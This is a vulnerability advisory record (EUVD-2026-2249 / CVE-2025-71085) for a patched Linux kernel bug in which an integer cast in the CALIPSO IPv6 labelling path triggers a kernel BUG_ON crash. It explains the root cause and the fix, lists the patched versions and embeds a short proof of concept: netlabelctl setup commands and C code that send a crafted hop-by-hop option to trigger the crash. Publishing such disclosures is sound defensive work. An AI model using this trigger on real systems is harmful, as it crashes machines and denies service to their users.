{"id": "EUVD-2026-2249", "enisaUuid": "ab6688bc-40f5-391c-b25e-4c3407cc7664", "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()\n\nThere exists a kernel oops caused by a BUG_ON(nhead < 0) at\nnet/core/skbuff.c:2232 in pskb_expand_head().\nThis bug is triggered as part of the calipso_skbuff_setattr()\nroutine when skb_cow() is passed headroom > INT_MAX\n(i.e. (int)(skb_headroom(skb) + len_delta) < 0).\n\nThe root cause of the bug is due to an implicit integer cast in\n__skb_cow(). The check (headroom > skb_headroom(skb)) is meant to ensure\nthat delta = headroom - skb_headroom(skb) is never negative, otherwise\nwe will trigger a BUG_ON in pskb_expand_head(). However, if\nheadroom > INT_MAX and delta <= -NET_SKB_PAD, the check passes, delta\nbecomes negative, and pskb_expand_head() is passed a negative value for\nnhead.\n\nFix the trigger condition in calipso_skbuff_setattr(). Avoid passing\n\"negative\" headroom sizes to skb_cow() within calipso_skbuff_setattr()\nby only using skb_cow() to grow headroom.\n\nPoC:\n\tUsing `netlabelctl` tool:\n\n        netlabelctl map del default\n        netlabelctl calipso add pass doi:7\n        netlabelctl map add default address:0::1/128 protocol:calipso,7\n\n        Then run the following PoC:\n\n        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);\n\n        // setup msghdr\n        int cmsg_size = 2;\n        int cmsg_len = 0x60;\n        struct msghdr msg;\n        struct sockaddr_in6 dest_addr;\n        struct cmsghdr * cmsg = (struct cmsghdr *) calloc(1,\n                        sizeof(struct cmsghdr) + cmsg_len);\n        msg.msg_name = &dest_addr;\n        msg.msg_namelen = sizeof(dest_addr);\n        msg.msg_iov = NULL;\n        msg.msg_iovlen = 0;\n        msg.msg_control = cmsg;\n        msg.msg_controllen = cmsg_len;\n        msg.msg_flags = 0;\n\n        // setup sockaddr\n        dest_addr.sin6_family = AF_INET6;\n        dest_addr.sin6_port = htons(31337);\n        dest_addr.sin6_flowinfo = htonl(31337);\n        dest_addr.sin6_addr = in6addr_loopback;\n        dest_addr.sin6_scope_id = 31337;\n\n        // setup cmsghdr\n        cmsg->cmsg_len = cmsg_len;\n        cmsg->cmsg_level = IPPROTO_IPV6;\n        cmsg->cmsg_type = IPV6_HOPOPTS;\n        char * hop_hdr = (char *)cmsg + sizeof(struct cmsghdr);\n        hop_hdr[1] = 0x9; //set hop size - (0x9 + 1) * 8 = 80\n\n        sendmsg(fd, &msg, 0);", "datePublished": "2026-01-13T15:34:48", "dateUpdated": "2026-01-13T15:34:48", "baseScore": 0.0, "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-71085", "https://git.kernel.org/stable/c/2bb759062efa188ea5d07242a43e5aa5464bbae1", "https://git.kernel.org/stable/c/58fc7342b529803d3c221101102fe913df7adb83", "https://git.kernel.org/stable/c/73744ad5696dce0e0f43872aba8de6a83d6ad570", "https://git.kernel.org/stable/c/bf3709738d8a8cc6fa275773170c5c29511a0b24", "https://git.kernel.org/stable/c/c53aa6a5086f03f19564096ee084a202a8c738c0"], "aliases": ["CVE-2025-71085", "GHSA-hjpx-f2r6-rr4q"], "assigner": "Linux", "epss": 0.02, "enisaIdProduct": [{"id": "10d11f6f-83e1-3977-82fb-ebc19167d8d4", "product": {"name": "Linux"}, "product_version": "patch: 6.1.160"}, {"id": "1a1bddbb-4775-3aa2-b0eb-b15fe9a087e0", "product": {"name": "Linux"}, "product_version": "patch: 6.19-rc4"}, {"id": "1f269396-d97f-3025-9e3d-a819c4ca89d3", "product": {"name": "Linux"}, "product_version": "2917f57b6bc15cc6787496ee5f2fdf17f0e9b7d3 <2bb759062efa188ea5d07242a43e5aa5464bbae1"}, {"id": "229a1531-4812-35df-b50a-a94d7956cc10", "product": {"name": "Linux"}, "product_version": "2917f57b6bc15cc6787496ee5f2fdf17f0e9b7d3 <58fc7342b529803d3c221101102fe913df7adb83"}, {"id": "7cec041d-3dd1-3869-b29f-2a4dfb760c52", "product": {"name": "Linux"}, "product_version": "patch: 6.6.120"}, {"id": "908055e1-6132-3b33-8e62-21d405a3404e", "product": {"name": "Linux"}, "product_version": "patch: 6.12.64"}, {"id": "b71a317f-8335-309f-950f-61032e529b9c", "product": {"name": "Linux"}, "product_version": "patch: 0"}, {"id": "c851f59b-2847-339a-bbf2-7e1b237536fa", "product": {"name": "Linux"}, "product_version": "2917f57b6bc15cc6787496ee5f2fdf17f0e9b7d3 <73744ad5696dce0e0f43872aba8de6a83d6ad570"}, {"id": "d71ba065-1243-389d-bba2-30155ddfb37c", "product": {"name": "Linux"}, "product_version": "2917f57b6bc15cc6787496ee5f2fdf17f0e9b7d3 <c53aa6a5086f03f19564096ee084a202a8c738c0"}, {"id": "d803e841-46ea-3343-8fec-2e8d28fe3ceb", "product": {"name": "Linux"}, "product_version": "4.8"}, {"id": "deceb6d0-5521-39b2-83bc-4e2013bc9cd2", "product": {"name": "Linux"}, "product_version": "2917f57b6bc15cc6787496ee5f2fdf17f0e9b7d3 <bf3709738d8a8cc6fa275773170c5c29511a0b24"}, {"id": "fbe1f68d-7186-3527-8836-7ad86e26a9dd", "product": {"name": "Linux"}, "product_version": "patch: 6.18.4"}], "enisaIdVendor": [{"id": "d00f2cf1-3002-3952-b9db-e83246112adc", "vendor": {"name": "Linux"}}], "isExploited": false}